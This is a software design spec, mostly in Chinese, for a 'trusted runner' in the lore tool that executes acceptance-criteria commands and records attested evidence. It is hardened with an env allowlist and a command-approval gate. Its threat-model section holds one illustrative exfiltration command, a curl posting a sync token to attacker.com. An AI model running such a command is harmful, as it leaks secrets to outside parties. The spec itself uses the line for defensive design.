---
id: SPEC-039
type: spec
role: spec
title: "SPEC-039 — Trusted runner: attested evidence for script-mode ACs"
status: approved
priority: medium
created: 2026-07-08
updated: 2026-07-13
tags: [verify, attestation, evidence, runner, spec-039, trust-hardening]
parent: PRD-001
links:
  - {id: ADR-001, type: relates-to}
---
# SPEC-039 — Trusted runner:script-mode AC 的 attested evidence

> Feature spec (draft)。Module-primary: core schema + runner service + spawn executor + CLI/MCP 面。
> Upstream: SPEC-038(AC-as-code,verify.script 预留扩展点)、SPEC-025(evidence)、PRD §14(反馈可信度,非 R2 内容)。
> 经 4 路并行评审(coupling/cohesion/reuse+security/testing)修订;两处草案错误被评审证据纠正(见 §9)。
> **2026-07-13 §M2 trust-hardening 修订**(review finding M2):`sync.enabled` 后任何已认证 writer 都能在 spec 里种下恶意 `verify.command`,在**验证者自己的 env**(含 `LORE_SYNC_TOKEN`/API keys)下 RCE。原 §1 信任边界("npm-scripts 信任级、env 全量直通、无沙箱")本身仍然有效——不撤回、不假装能做容器级沙箱——但补三层默认硬化:**env allowlist**(§1.1)、**command-provenance 审批闸**(§1.2)、**command-provenance 标注**(§1.3)。三层都有独立 config/flag escape,`passthrough_all: true` + `require_command_approval: false` = 原 pre-M2 行为逐字复原。见 §1.1-§1.3、§4 补充语义表、§10 AC-VRF-13..18。

## 1. Problem & Goal

SPEC-038 后 AC 已结构化,但 evidence 的 `result` 仍是调用方断言——`lore evidence --result pass` 与真实跑过命令之间没有机械关联。Anthropic 观察的长时 agent #1 失败模式("mark complete without proper testing")在自报模式下只能靠纪律防守。

**Goal**:`lore verify` 让 lore 亲自执行 AC 绑定的 command,**result 由 exit code 推导**(exit 0 → pass,非零 → fail),evidence 携带 attestation 元数据,且 attestation **只有一个注入点**(伪造在 schema 层被拒)。反馈可信度从"信任声明"升级为"默认路径机械可信"。

**信任边界(显式声明,不卖安全剧场 —— 2026-07-13 §M2 修订,见下三条子节)**:
- 命令来自 spec 的 acceptance_criteria 声明 = 团队已审计,信任级 = npm scripts;调用方本就有 shell,runner 不构成提权,不做容器沙箱(**未变**——§M2 加的是默认防护层,不是沙箱)
- attestation 的价值是"默认路径可信 + 伪造有闸",非密码学不可篡改(本地 SQLite 任何进程可写)
- runner 不自动改任何 doc 状态、不 approve(§14 R2 红线)
- ⚠ 已过闸(approved)的命令仍以调用方的 shell 权限运行——§M2 三层防的是"陌生/被篡改命令免审自动执行 + 默认泄露秘密到子进程 env",不是"恶意命令本身能做什么"(那部分仍是 npm-scripts 信任级的既有权衡)

### 1.1 Env allowlist(默认开,可配置转义)

原 "env 直通 process.env,不加 denylist" 的信任边界文字本身没错(测试命令常需要真实环境),但**直通全部** env 意味着 `sync.enabled` 场景下 `LORE_SYNC_TOKEN`/`LORE_API_KEY` 等秘密对任何已过闸的命令可见——不需要恶意命令本身"高明",只要它敢 `curl attacker.com -d @$LORE_SYNC_TOKEN` 就够了。

**新默认**:spawn 子进程只拿得到一个 allowlist 内的 env 变量子集(`packages/lore/src/service/verify-spawn.ts::DEFAULT_VERIFY_ENV_ALLOWLIST`):`PATH, HOME, USER, LOGNAME, SHELL, LANG, LC_*`(前缀匹配)`, TZ, TMPDIR, TEMP, TMP, TERM, PWD`。这组是"跑得动一般 build/test 工具链"的最小集,不含任何秘密类变量。

**Escape**:`.lore/config.yaml` 的 `verify.env.allowlist: string[]`(**追加**到默认集,不是替换)+ `verify.env.passthrough_all: boolean`(默认 `false`;`true` = 恢复 pre-§M2 全量直通,allowlist 整段不再生效)。纯函数 `resolveVerifyEnv(processEnv, opts)`(`verify-spawn.ts`,vitest 可测)是唯一过滤点;`env` 字段在 `VerifySpawnSpec` 上是 **optional**——省略等价于"继承父进程完整 env"(`passthrough_all: true` 或未经 `buildVerifySpawnSpec` 手工构造的 spec,如既有 `.bun.test.ts` 直接字面量夹具)。`Bun.spawn({env})` 是**替换**而非合并父 env(已针对本仓库 Bun 1.3.10 实测验证,非训练记忆推断)。

### 1.2 Command-provenance 审批闸(默认开,可配置/flag 转义)

Env allowlist 挡住了"泄露秘密",但没挡住"执行一个 spec 里刚被(恶意)改过的陌生命令"本身。§M2 第二层:执行前检查该 AC 的 `verify.command` 字符串是否**逐字**出现在目标 task 的 `extra.verification_evidence` 历史里(核心纯函数 `isApprovedVerifyCommand(task, command)`,`@lore/core` `task-workflow.ts`)——出现过 = "已知/已批准",没出现过(全新或哪怕只改了一个字符)= "未批准",需要显式批准才能执行。

**三条批准路径**(CLI/MCP 二选一实现,互不共享交互能力):
1. CLI 交互 TTY(`process.stdin.isTTY` 且未传 `--json`)——逐 AC 弹 `Run new/changed verify command "<cmd>"? [y/N]`(`promptYesNo`,`node:readline/promises`);非 y/yes → 该次 `lore verify` 整体中止(与既有 launch-failure 中止用同一"已记录 N 个 AC"措辞)。
2. `--allow-new-commands`(别名 `--yes`,CLI)/ `allow_new_commands: true`(MCP `lore_verify`)——本次运行内所有未批准命令自动放行,不弹窗;非交互/CI 必须用这条。
3. 两者都没有(非交互、无 flag、MCP 默认)——直接以 `NEEDS_APPROVAL`(新 `LoreError` code,CLI exit **7**)中止在该 AC,消息里点名确切的 `--allow-new-commands` 恢复命令。

**已知命令永不弹窗**(REGRESSION 红线,§10 AC-VRF-15)——`isApprovedVerifyCommand` 命中即跳过整套审批逻辑,不管 TTY/flag 状态如何。

**Escape**:`verify.require_command_approval: boolean`(默认 `true`)。`false` = 整个闸门连带跳过,任何命令(新旧)都直接执行——逐字复原 pre-§M2 行为。

### 1.3 Command-provenance 标注(附属产物,无独立开关)

一个命令被判定"未批准"(不管走哪条批准路径通过)时,其 evidence 记录的 `attestation` 对象上附一个 `first_seen: true`(`evidenceEntrySchema.attestation.first_seen`,**optional**,`@lore/core` `task-workflow.ts`,additive/REGRESSION-safe——旧 attestation 对象没有这个字段照样解析)。已知命令**不**打这个标记(省略,不是 `false`,与本模块 `upstream_unapproved`/`anchorless` 的"present-iff-true"惯例一致)。`lore verify` 的每 AC 输出行追加 `[new]` 后缀(仅当 `first_seen === true`);`--json`/`lore_verify` 的 `results[].first_seen` 同步透出。这层判定与 §1.2 的闸门开关**无关**——即使 `require_command_approval: false` 关闭了审批闸,`first_seen` 依然如实反映"这条命令是否首次出现",不因闸门关闭而失真。

## 2. Layer Stack 映射

```
packages/core/src/task-workflow.ts     ← ATTESTATION_RUNNERS = ["lore-cli"] as const(枚举 tuple,非裸 literal——ORACLE_KINDS 教训);
                                          evidenceEntrySchema += attestation?: z.object({runner: z.enum(ATTESTATION_RUNNERS),
                                          exit_code: int, duration_ms: int≥0, timed_out: boolean}).optional() ⛔必须 optional
                                          (extractEvidence 整数组 fail-closed:必填会让全部存量 evidence 静默归零);
                                          + resolveTargetTask(tasks, opts) 纯函数(组合 extractClaim/isClaimStale)
packages/core/src/acceptance.ts        ← verify.script += timeout_ms?: int>0 optional(D2 预留字段首启;cwd/env 继续延后);
                                          computeAcCoverage facts += refs[].attested + attested_pass/attested_fail(attested 判定唯一推导点)
packages/core/src/config.ts            ← 新 verify 段:{ default_timeout_ms: 300000 }(对齐 audit.* 独立段先例)
packages/lore/src/service/task-workflow-service.ts
                                       ← EvidenceInput 改 Omit<EvidenceEntry,"recorded_at"|"attestation">;
                                          addEvidence 收到带 attestation 的输入 → VALIDATION_ERROR fail-loud(不静默剥离);
                                          NEW recordVerifiedEvidence(idOrSlug, entry+attestation, now) —— attestation 唯一注入点,
                                          不暴露给 CLI/MCP,仅 VerifyRunnerService 调用
packages/lore/src/service/verify-runner-service.ts
                                       ← NEW VerifyRunnerService:纯编排四步全委托——
                                          ① 注入的 getPlanBundle 取数(bound-function 端口,镜像 resolveDeclaredAcIds 装配)
                                          ② core resolveTargetTask 解析宿主 task(显式 --task 优先;缺省唯一非 stale claim;0/n → err 列候选)
                                          ③ 注入的 executor 执行 ④ 注入的 recordVerifiedEvidence 记账
packages/lore/src/service/verify-spawn.ts     ← 纯函数(vitest):buildVerifySpawnSpec(criterion, config) + deriveVerifyResult(exitCode, timedOut)
packages/lore/src/service/verify-executor.ts  ← bun-only(文件头声明,镜像 claude-cli-provider):Bun.spawn detached 新进程组,
                                          kill(-pid) SIGTERM → 5s grace → kill(-pid) SIGKILL(⚠ 新行为:现有 provider 只发 SIGTERM,
                                          此处为 SPEC-039 新增的升级链,防 fork 子孙存活);stdout+stderr 合并截断 4000 → output_tail
packages/lore/src/adapters/cli/commands/verify.ts ← lore verify <plan> [--ac <id>...] [--task <t>] [--json] [--by]
                                          [--allow-new-commands|--yes](§M2)
packages/lore/src/adapters/mcp/tools.ts    ← NEW lore_verify {plan, ac?, task?, by}(第 24 个工具;agent 面的自报替代)
                                          + allow_new_commands?: boolean(§M2,MCP 非交互——无 TTY 回退,只有这个 flag)
packages/lore/src/ai/assess-template.ts    ← AC 表 coverage 列加 attested 注记("2 pass (1 attested)");ASSESS_PROMPT_VERSION 4→5
ac list 渲染                                ← attested-pass 前缀 ⚑✔(渲染归消费者,判定在 computeAcCoverage)

——— 2026-07-13 §M2 trust-hardening 新增/改动 ———
packages/core/src/task-workflow.ts     ← NEW isApprovedVerifyCommand(task, command): boolean(纯函数,extractEvidence 命令逐字比对);
                                          evidenceEntrySchema.attestation += first_seen?: boolean(optional,additive,§1.3)
packages/core/src/errors.ts            ← NEW LoreError code "NEEDS_APPROVAL" {message, command, ac_id}(CLI exit 7)
packages/core/src/config.ts            ← verify 段扩:+ env: {allowlist: string[] = [], passthrough_all: boolean = false}(独立 .strict()
                                          子段)+ require_command_approval: boolean = true;新增解析器 resolveVerifyEnvConfig /
                                          resolveVerifyRequireCommandApproval(镜像 resolveVerifyDefaultTimeoutMs 先例)
packages/lore/src/service/verify-spawn.ts ← NEW DEFAULT_VERIFY_ENV_ALLOWLIST(const 数组)+ resolveVerifyEnv(processEnv, opts) 纯函数
                                          (§1.1);VerifySpawnSpec += env?: Record<string,string>(optional,省略=继承父 env);
                                          buildVerifySpawnSpec 新增 opts.env 透传参数
packages/lore/src/service/verify-executor.ts ← Bun.spawn 新增 ...(spec.env !== undefined ? {env: spec.env} : {})
                                          (Bun.spawn({env}) 替换而非合并父 env,已实测验证)
packages/lore/src/service/verify-runner-service.ts ← verifyPlan 主循环插入 ②.5 审批闸(§1.2)——resolveVerifyEnv 每次 run 只算一次(不
                                          随 AC 变化);VerifyPlanOpts += allowNewCommands?/confirmUnapprovedCommand?(per-call opt,
                                          非 constructor DI——CLI 传 TTY 回调、MCP 从不传,app.ts 保持 adapter-agnostic);
                                          config bundle += requireCommandApproval/envAllowlist/envPassthroughAll/processEnv;
                                          VerifyAcResult += first_seen?: boolean
packages/lore/src/app.ts               ← buildAppFromSqlite/buildAppFromTurso 新增 verifyEnvConfig/verifyRequireCommandApproval 参数
                                          (resolveVerifyEnvConfig(config)/resolveVerifyRequireCommandApproval(config));
                                          VerifyRunnerService 装配处新增 processEnv: process.env(装配时刻捕获一次,镜像 repoRoot
                                          从 process.cwd() 捕获的先例——VerifyRunnerService 自身从不读 process.env)
packages/lore/src/adapters/cli/commands/verify.ts ← NEW --allow-new-commands/--yes flag;promptYesNo(node:readline/promises,仅
                                          TTY 且非 --json 时装配);formatAcResultLine 追加 [new] 后缀(first_seen === true 时)
packages/lore/src/adapters/cli/utils.ts    ← exitCode()/formatError() 新增 NEEDS_APPROVAL 分支(exit 7)
packages/lore/src/adapters/http/middleware.ts ← loreErrorToStatus() 新增 NEEDS_APPROVAL 分支(422,穷尽 switch 强制,当前无 HTTP verify 路由)
packages/lore/src/eval/scenarios/placeholder-parse.ts ← loreErrorMessage() 新增 NEEDS_APPROVAL 分支(穷尽 switch 强制)
```

## 3. 关键语义

| 情形 | 行为 |
|---|---|
| exit 0 | evidence result=pass + attestation |
| 非零 exit | evidence result=fail + attestation(fail 是数据,不是错误) |
| 超时 | SIGTERM(-pid) → 5s → SIGKILL(-pid);evidence result=fail + timed_out=true |
| spawn 启动失败(ENOENT 等) | err(EXECUTION 类错误),**不记 evidence**(环境坏 ≠ 代码 fail,不诬陷代码) |
| 目标 task 歧义(0 或 >1 候选且无 --task) | err 列出候选,fail-loud |
| draft spec 的 AC | 执行 + stderr 警告行(不硬闸:实现期需要 verify,且调用方本就有 shell) |
| ai/human mode 的 AC | 跳过并在输出中列明(runner 只管 script) |
| 伪造:CLI/MCP evidence 带 attestation | VALIDATION_ERROR,拒收 |
| 命令未批准 + 已拒绝/无法批准(§1.2) | err(NEEDS_APPROVAL),CLI exit 7,不记 evidence——同一 run 内已完成的 AC 保留(不回滚) |
| 命令未批准 + 已批准(TTY confirm / --allow-new-commands / allow_new_commands) | 正常执行,attestation.first_seen = true(§1.3) |
| 命令已在 evidence 历史中(逐字匹配) | 跳过整套审批逻辑,不弹窗、不检查 flag,直接执行,attestation 不带 first_seen |
| `verify.require_command_approval: false` | §1.2 全跳过(等价 pre-§M2:任何命令免审执行),但 first_seen 判定仍照常计算(§1.3 与闸门开关无关) |
| `verify.env.passthrough_all: true` | §1.1 allowlist 不再生效,子进程继承完整父 env(逐字复原 pre-§M2 行为) |

## 4. Design Decisions

| # | Decision | Choice | Rationale(评审来源) | Trade-off |
|---|---|---|---|---|
| D1 | attestation 形状 | 嵌套 optional 对象;runner 用 as const tuple 枚举 | 缺席=self-reported 自描述;必填会触发 extractEvidence 整数组静默归零(Testing);裸 literal 重蹈三拷贝覆辙(Security) | 旧记录无法追溯标注 |
| D2 | 防伪 | 公开 EvidenceInput 排除 attestation + fail-loud 拒收;recordVerifiedEvidence 内部唯一注入点 | 不修则 spec 反向制造虚假可信信号,比没有更糟(Security,critical) | 多一个 service 方法 |
| D3 | runner 依赖 | 双 bound-function 端口(getPlanBundle + recordVerifiedEvidence),app.ts 装配 | 不引 service→service 依赖;不建第二条遍历 locus(Coupling) | 装配线 +2 |
| D4 | task 匹配 | core 纯函数 resolveTargetTask,组合既有 isClaimStale/extractClaim | 可测启发式不裸写进 service(Cohesion);fixture 零新增(Testing) | core +1 导出 |
| D5 | spawn 拆分 | 纯 spec builder + result mapper(vitest)/ bun-only executor 两文件 | hermetic-spawn/provider 既有二分先例(Coupling/Testing) | 文件 +1 |
| D6 | 进程树终止 | detached 进程组 + kill(-pid),SIGTERM→5s→SIGKILL | 顶层 kill 杀不死 fork 子孙(Security);⚠ 显式标注为新行为,无既有先例(Coupling 纠错) | 平台语义依赖 POSIX |
| D7 | env(**⚠ 2026-07-13 §M2 AMENDED,见 D11**) | ~~直通,不加 denylist~~ → 默认 allowlist,`passthrough_all: true` 转义回原行为 | 威胁模型接受"npm-scripts 级恶意命令能做什么"不等于接受"默认把秘密塞进它的 env"——review finding M2 纠正了这条决策的范围(Security) | 秘密仍对**已批准**命令可见(未变);allowlist 需要维护默认集 |
| D8 | attested 推导 | computeAcCoverage 单点;渲染归消费者 | SPEC-038 D6 约定延续(Cohesion) | 消费者各写格式化 |
| D9 | config | 独立 verify.* 段 | audit.* 先例(Cohesion) | — |
| D10 | 真实 spawn 测试经济 | 双注入测全部业务逻辑;真 spawn 仅 2 个 bun test(SIGTERM 短 stub + SIGKILL trap-stub 各 1,后者 ≥5s 唯一一次) | ai-timeout.bun.test.ts 既有经济模式(Testing) | SIGKILL 路径 1 次 5s 真实耗时 |
| D11 | env allowlist(§M2,取代 D7 的"不加 denylist"结论) | 白名单制,非黑名单制;`LC_*` 前缀匹配,其余枚举;config additive + passthrough_all 转义 | 白名单比黑名单更难绕过(遗漏一个秘密变量名 = 黑名单失守,遗漏一个无害变量名 = 白名单只是少个功能);`Bun.spawn({env})` 语义已实测为替换不合并,天然适配白名单实现(Security) | 极端场景下用户命令依赖的小众 env 变量需手动加进 `verify.env.allowlist` |
| D12 | command-provenance 审批(§M2) | 逐字字符串比对 evidence 历史(非语义/AST diff);CLI 三选一(TTY prompt / flag / 拒绝),MCP 二选一(flag / 拒绝,无 prompt) | 逐字比对足够——目标是"这条命令有没有被人看过",不是"两条命令语义等价"(改一个字符就该重新过一遍人眼,Security);MCP 无 TTY 天然不能做交互(Coupling,adapter 边界) | 命令字符串的无害格式化改动(如加个注释)也会触发重新批准 |
| D13 | first_seen 标注位置 | 嵌套进 `attestation` 对象而非顶层新字段 | 语义上从属于"这条 attestation 是不是首次批准执行的产物",与 attestation 的其余字段(runner/exit_code/...)同源同生命周期(Cohesion);复用 attestation 已有的 optional/additive schema 保证(Testing,不用重新验证一次"新字段不破坏 legacy 解析") | — |

## 5. SPEC-039 自身 AC(dogfood:实现后由 lore verify 亲自验证——attested evidence 验证 attestation 自身)

| id | statement | verify |
|---|---|---|
| AC-VRF-1 | attestation optional;混合数组(legacy 无 + 新 有)经 extractEvidence 整体可解析 | script:test — core 测试 |
| AC-VRF-2 | CLI/MCP evidence 输入携带 attestation → VALIDATION_ERROR 拒收(exit 4) | script:test |
| AC-VRF-3 | lore verify 走通:exit0 命令 → attested pass evidence(exit_code/duration_ms 正确) | script:test |
| AC-VRF-4 | deriveVerifyResult:0→pass,非零→fail;纯函数 | script:test |
| AC-VRF-5 | 超时:SIGTERM 达进程组;trap TERM 存活者 5s 后被 SIGKILL;evidence fail+timed_out | script:test — bun test(真 spawn ×2) |
| AC-VRF-6 | ENOENT → err,无 evidence 落库 | script:test |
| AC-VRF-7 | resolveTargetTask 矩阵:0/1/n claim、stale、--task 覆盖 | script:test |
| AC-VRF-8 | computeAcCoverage attested 计数正确;ac list 渲染 ⚑ 前缀 | script:test |
| AC-VRF-9 | assess prompt v5 + attested 注记;3 处版本断言同步更新 | script:test |
| AC-VRF-10 | lore verify CLI 与 lore_verify MCP happy/negative 路径 | script:test |
| AC-VRF-11 | 双 runner 全量零回归 | script:test — bun run test |
| AC-VRF-12 | typecheck 通过 | script:tsc — bun run typecheck |
| AC-VRF-13(§M2) | resolveVerifyEnv:默认 allowlist 过滤秘密变量;config additive allowlist 生效;LC_* 前缀匹配;passthrough_all: true 时返回 undefined(全量继承) | script:test |
| AC-VRF-14(§M2) | 非交互(无 TTY、无 flag)执行未批准命令 → err(NEEDS_APPROVAL),CLI exit 7;--allow-new-commands / allow_new_commands: true 放行 | script:test |
| AC-VRF-15(§M2) | 命令已在 task evidence 历史中(逐字匹配)→ 跳过整套审批逻辑,不弹窗、executor 立即执行 | script:test |
| AC-VRF-16(§M2) | require_command_approval: false → 审批闸整段跳过,任意命令免审执行 | script:test |
| AC-VRF-17(§M2) | 命令首次执行 → attestation.first_seen: true;沿用命令的后续执行 → first_seen 缺席(非 false) | script:test |
| AC-VRF-18(§M2) | lore_verify MCP:allow_new_commands: false(默认)+ 未批准命令 → isError 命名字段;true → 正常执行 | script:test |

## 6. 测试策略(六维度,按 Testing 视角经济模型)

HAPPY: VRF-3/4/8/10、VRF-13/17(§M2);NEGATIVE: VRF-2/6/7(歧义)、VRF-14(§M2 非交互拒绝);BOUNDARY: timeout_ms 边界、输出 4000 截断、空 script AC 集、VRF-13 的 LC_* 前缀边界;ERROR: 端口 err 透传、spawn 启动错、VRF-14 的 confirmUnapprovedCommand 拒绝分支;STATE: verify 后 coverage 从 ·→⚑✔、重复 verify 追加不覆盖、VRF-15(§M2 已知命令免审);REGRESSION: VRF-1 混合数组(**新 oracle,现有兼容测试未覆盖**)、v4 断言迁移、VRF-11 全量、VRF-16(§M2 escape 复原旧行为)。业务逻辑全走注入 double(vitest);真 spawn 仅 2 个 bun test;§M2 的 env allowlist/审批闸/first_seen 额外有一层真实子进程 CLI 集成测试(`tests/integration/cli/verify.test.ts`,`test -z "$LORE_SYNC_TOKEN"` 之类的 shell 断言,证明子进程真实 env 而非仅测纯函数)。

## 7. Non-goals

容器/VM 沙箱;远程/CI runner(ATTESTATION_RUNNERS 枚举已留位);自动状态变更/auto-approve(§14 R2);ai/human mode 的自动裁决;attestation 密码学签名。§M2 追加:env allowlist 不是"净化不可信输入"(命令本身仍是 npm-scripts 信任级,不做参数消毒/shell 转义审查);command-provenance 审批不是语义/AST 级 diff(纯字符串逐字比对);first_seen 标注不驱动任何自动化决策(纯观测性标注,不影响 pass/fail 判定、不影响 doc 状态)。

## 8. Perspective Tensions Resolved

| Tension | Resolution |
|---|---|
| 依赖形状(双 service vs 端口 vs 自建遍历) | 双 bound-function 端口(Coupling),getPlanBundle 复用不新增 resolvePlanScriptAcs |
| 防伪 vs API 简单 | 公开路径 fail-loud 拒收 + 内部唯一注入点(Security critical,成本一个方法) |
| 真 spawn 覆盖 vs flake | double 测逻辑 + 恰好 2 个真 spawn test(Testing) |
| env 净化 vs 过度设计(**⚠ 2026-07-13 §M2 结论反转,见下)** | ~~直通 + 显式声明 trade-off,不加 denylist(Security 自己反对加)~~ → review finding M2 指出"不加防护"本身才是过度信任 sync 场景下的多 writer 威胁模型;白名单制默认防护 + 可配置转义(D11) |
| §M2:审批摩擦 vs CI 可用性 | 三条批准路径(TTY prompt / --allow-new-commands / config 关闭),CI 场景永远有非交互解;已知命令零摩擦(D12) |
| §M2:防护默认值 vs 向后兼容 | 默认硬化(env allowlist on、审批闸 on)是有意的破坏性变更(用户明确要求"deliberately CHANGES default behavior"),但每层都有逐字复原 pre-M2 行为的 config/flag escape,旧的 CI 脚本加两行 config 或一个 flag 即可保持原状 |

## 9. 评审对草案的两处事实纠错(留档)

1. 草案称 SIGKILL 升级"镜像 ClaudeCliProvider"——实际 provider 只发 SIGTERM,无升级链。已改标为 SPEC-039 新行为(D6)。
2. 草案想当然认为 attestation 可平滑加入 schema——Testing 查证 extractEvidence 整数组 fail-closed,必填即静默数据事故;且现有兼容测试从未测混合数组。已锁定 optional + 新增混合数组 oracle(AC-VRF-1)。

## 10. §M2 trust-hardening(2026-07-13,review finding M2)

见 §1.1-§1.3(三层防护的完整设计叙述)、§2(§M2 新增/改动文件清单)、§3(补充语义表行)、§4 D11-D13(三条新 Design Decision,D7 被 D11 amend)、§5/§10(AC-VRF-13..18)。三层防护 —— env allowlist(§1.1)、command-provenance 审批(§1.2)、command-provenance 标注(§1.3)—— 都是**默认开、显式可关**:`verify.env.passthrough_all: true` + `verify.require_command_approval: false` 组合等价于逐字恢复 pre-§M2(2026-07-08 原始实现)的行为。这是本次修订的验收基准:任何一层单独打开转义都不影响另外两层的行为(三层相互独立,§3 语义表最后两行已验证 first_seen 与审批闸开关无关)。

## Quality Gates(module mode)
- [x] 无循环依赖(core 纯函数 ← service 编排 ← adapter;executor bun-only 隔离)
- [x] 单一职责(runner-service 四步全委托;判定逻辑全在 core 纯函数;注入点唯一)
- [x] 公共 API 足以黑盒测试(double executor + 端口 stub + 纯函数)
- [x] 依赖可注入(getPlanBundle/recordVerifiedEvidence/executor 三注入)


## Acceptance Criteria (structured)

- [✔] [script] AC-VRF-1: attestation is optional on evidenceEntrySchema; a mixed evidence array (legacy entry without + new entry with attestation) parses as a whole via extractEvidence
  script: test — bunx vitest run packages/core/src/task-workflow.test.ts
- [✔] [script] AC-VRF-2: evidence write surfaces (CLI lore evidence / MCP lore_evidence_add) reject input carrying attestation with VALIDATION_ERROR exit 4
  script: test — bunx vitest run packages/lore/tests/unit/service/task-workflow-service.test.ts
- [✔] [script] AC-VRF-3: lore verify end-to-end: exit-0 command produces attested pass evidence with correct exit_code and duration_ms via recordVerifiedEvidence sole injection site
  script: test — bunx vitest run packages/lore/tests/unit/service/verify-runner-service.test.ts
- [✔] [script] AC-VRF-4: deriveVerifyResult pure fn: exit 0 maps to pass, nonzero to fail, timeout flag preserved
  script: test — bunx vitest run packages/lore/tests/unit/service/verify-spawn.test.ts
- [✔] [script] AC-VRF-5: timeout delivers SIGTERM to the process group; a TERM-trapping survivor is SIGKILLed after the grace period; evidence records fail with timed_out true
  script: test — cd packages/lore && bun test tests/integration/verify-executor.bun.test.ts
- [✔] [script] AC-VRF-6: spawn launch failure (ENOENT) returns err and records no evidence
  script: test — cd packages/lore && bun test tests/integration/verify-executor.bun.test.ts
- [✔] [script] AC-VRF-7: resolveTargetTask matrix: zero/one/many fresh claims, stale claim excluded, explicit task override wins, ambiguity fails loud listing candidates
  script: test — bunx vitest run packages/core/src/task-workflow.test.ts
- [✔] [script] AC-VRF-8: computeAcCoverage carries attested counts as the single derivation point; ac list renders attested-pass prefix
  script: test — bunx vitest run packages/core/src/acceptance.test.ts packages/lore/tests/unit/service/ac-service.test.ts
- [✔] [script] AC-VRF-9: assess prompt bumps to version 5 with attested annotation in the AC table; the three version-4 assertions migrate in the same change
  script: test — bunx vitest run packages/lore/tests/unit/service/ai-provider-service-assess.test.ts
- [✔] [script] AC-VRF-10: lore verify CLI and lore_verify MCP happy and negative paths (ambiguous task, no script ACs, draft-spec warning)
  script: test — bunx vitest run packages/lore/tests/integration/cli/verify.test.ts
- [✔] [script] AC-VRF-11: full suites pass on both runners with zero regressions
  script: test — bun run test
- [✔] [script] AC-VRF-12: monorepo typecheck passes
  script: tsc — bun run typecheck
- [✔] [script] AC-VRF-13 (§M2): resolveVerifyEnv filters to the default allowlist plus additive config entries, LC_* is a prefix match, and passthrough_all: true returns undefined (full inherit)
  script: test — bunx vitest run packages/lore/tests/unit/service/verify-spawn.test.ts
- [✔] [script] AC-VRF-14 (§M2): a new/changed command with no allowNewCommands flag and no confirmUnapprovedCommand callback aborts with NEEDS_APPROVAL (CLI exit 7); --allow-new-commands / allow_new_commands: true approves it
  script: test — bunx vitest run packages/lore/tests/unit/service/verify-runner-service.test.ts packages/lore/tests/integration/cli/verify.test.ts
- [✔] [script] AC-VRF-15 (§M2): a command already present in the target task's evidence history (exact string match) never triggers a prompt or flag check — the executor runs immediately
  script: test — bunx vitest run packages/lore/tests/unit/service/verify-runner-service.test.ts
- [✔] [script] AC-VRF-16 (§M2): verify.require_command_approval: false disables the approval gate entirely — any command (new or known) executes without approval
  script: test — bunx vitest run packages/lore/tests/unit/service/verify-runner-service.test.ts
- [✔] [script] AC-VRF-17 (§M2): a command's first execution marks attestation.first_seen: true; a subsequent execution of the same command omits the field (never false)
  script: test — bunx vitest run packages/core/src/task-workflow.test.ts packages/lore/tests/unit/service/verify-runner-service.test.ts
- [✔] [script] AC-VRF-18 (§M2): lore_verify MCP with allow_new_commands: false (default) and an unapproved command returns isError naming the field; allow_new_commands: true runs it
  script: test — bunx vitest run packages/lore/tests/unit/adapters/mcp-tools-verify.test.ts
